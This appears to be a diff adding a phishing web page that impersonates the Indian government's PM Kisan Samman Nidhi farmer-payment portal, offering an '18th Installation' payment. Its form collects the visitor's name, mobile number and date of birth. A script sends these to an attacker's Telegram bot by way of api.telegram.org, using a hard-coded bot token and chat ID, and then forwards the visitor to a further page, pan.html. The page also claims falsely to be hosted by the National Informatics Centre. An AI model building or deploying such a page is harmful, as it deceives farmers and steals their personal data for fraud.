@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Based eKYC</title>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/datepicker/1.0.10/datepicker.min.css">
+    <style>
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f7;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Main Content Section */
+        .main-content {
+            padding: 15px;
+        }
+
+        /* Form Section */
+        .ekyc-form {
+            background-color: #ffffff;
+            padding: 25px;
+            border-radius: 10px;
+            width: 40%;
+            margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .ekyc-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        .ekyc-form input:focus {
+            border-color: #1565c0;
+            outline: none;
+        }
+
+        .ekyc-form button {
+            background-color: #1565c0;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .ekyc-form button:hover {
+            background-color: #0044cc;
+        }
+
+        /* Processing Popup */
+        .processing-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            z-index: 1000;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: rgb(0, 0, 0);
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .mid-banner img {
+            max-width: 50%;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Responsive Design for Mobile */
+        @media (max-width: 768px) {
+            .ekyc-form {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main class="main-content" id="main-content">
+        <div class="ekyc-form">
+            <h3>Payment  18th Installation </h3>
+            <form id="ekycForm" action="#" method="POST">
+                <!-- Name Field -->
+                <input type="text" id="name" name="name" placeholder="Enter Your Name" required><br>
+
+                <!-- Mobile Field -->
+                <input type="text" id="mobile" name="mobile" placeholder="Enter Your Mobile Number (10 digits)" required minlength="10" maxlength="10"><br>
+
+                <!-- Date of Birth Field -->
+                <input type="text" id="dob" name="dob" placeholder="Select Date of Birth" readonly required><br>
+
+                <!-- Submit Button -->
+                <button type="submit" id="nextButton">Submit</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Processing Popup -->
+    <div id="processingPopup" class="processing-popup">
+        <p>Processing your request... Please wait.</p>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : 09/02/2025</p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Include Datepicker Library -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/datepicker/1.0.10/datepicker.min.js"></script>
+
+    <script>
+        // Initialize Datepicker
+        $(function() {
+            $('#dob').datepicker({
+                format: 'yyyy-mm-dd', // Date format
+                autoclose: true,
+                endDate: new Date(), // Restrict future dates
+                todayHighlight: true
+            });
+        });
+
+        // Form Submission Handler
+        document.getElementById('ekycForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Validate the Name field (only letters)
+            const name = document.getElementById('name').value;
+            const nameRegex = /^[A-Za-z\s]+$/; // Only alphabets and spaces
+            if (!nameRegex.test(name)) {
+                alert('Please enter a valid name 😊');
+                return;
+            }
+
+            // Validate Mobile Number (10 digits, Indian format)
+            const mobile = document.getElementById('mobile').value;
+            const mobileRegex = /^[6-9]\d{9}$/; // Starts with 6-9 and followed by 9 digits
+            if (!mobileRegex.test(mobile)) {
+                alert('Please enter a valid 10-digit mobile number 📱');
+                return;
+            }
+
+            // Validate Date of Birth (must be selected)
+            const dob = document.getElementById('dob').value;
+            if (!dob) {
+                alert('Please select your date of birth 📅');
+                return;
+            }
+
+            // Show Processing Popup
+            document.getElementById('processingPopup').style.display = 'block';
+
+            // Prepare Data to Send to Telegram Bot
+            const botToken = '7714806324:AAFOeSPa7CX_wxM1BRnEb1ZCJxpOlVHnhuw'; // Replace with your bot token
+            const chatId = '-1002253043573'; // Replace with your chat ID
+            const message = `Name: ${name}\nMobile: ${mobile}\nDate of Birth: ${dob}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send Data to Telegram Bot
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    // Hide Processing Popup
+                    document.getElementById('processingPopup').style.display = 'none';
+
+                    // Redirect to pan.html
+                    window.location.href = 'pan.html';
+                })
+                .catch(error => {
+                    // Hide Processing Popup
+                    document.getElementById('processingPopup').style.display = 'none';
+
+                    // Show Error Message
+                    alert('Something went wrong! Please try again. ❌');
+                });
+        });
+    </script>
+</body>
+</html>
